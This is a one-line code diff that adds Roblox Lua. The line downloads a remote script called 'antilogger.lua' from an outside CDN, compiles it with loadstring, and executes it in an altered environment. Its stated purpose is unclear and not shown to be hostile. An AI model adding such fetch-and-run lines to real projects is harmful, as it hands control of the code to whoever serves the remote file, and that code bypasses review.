@@ -1,0 +1,1 @@
+local s=game:GetService("HttpService"):GetAsync( "https://cdn.ocbwoy3.dev/assets/antilogger.lua" ,true) local env={NS=function(...)end} setmetatable(env,{__index=getfenv()})local e,x=loadstring(s)print(e,x)setfenv(e,env) e()
